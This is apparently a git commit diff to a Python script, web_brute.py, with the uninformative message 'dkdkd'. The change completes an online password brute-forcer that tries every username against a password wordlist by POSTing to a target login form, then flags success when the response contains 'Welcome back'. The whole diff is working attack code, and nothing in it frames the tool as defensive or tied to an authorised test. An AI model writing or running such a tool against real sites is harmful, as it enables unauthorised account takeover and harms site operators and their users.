59268b0a45d9bbac7f41749a9824ba17bc74bf2a
maximux <max@gmail.com>
2025-04-21 21:16:46 +0530

    dkdkd

--- web_brute.py
+++ web_brute.py
@@ -7,5 +7,16 @@ needle= "Welcome back"
 
 for username in usernames:
     with open (passwords, "r") as passwords_list:
-        password = password.strip("\n").encode()
-        sys.stdout.write("[X]) Attempting user:password -> {}:{}\r ".format(username, password.decode()))
+        for password in passwords_list:
+            password = password.strip("\n").encode()
+            sys.stdout.write("[X]) Attempting user:password -> {}:{}\r ".format(username, password.decode()))
+            sys.stdout.flush()
+            r=requests.post(target, data={"username": username, "password":password})
+            if needle.encode() in r.content:
+                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(),username))
+                sys.exit()
+        sys.stdout.flush()        
+        sys.stdout.write("\n")
+        sys.stdout.write("\t No password found for '{}'".format(username))
+        sys.stdout.write("\n")
+    
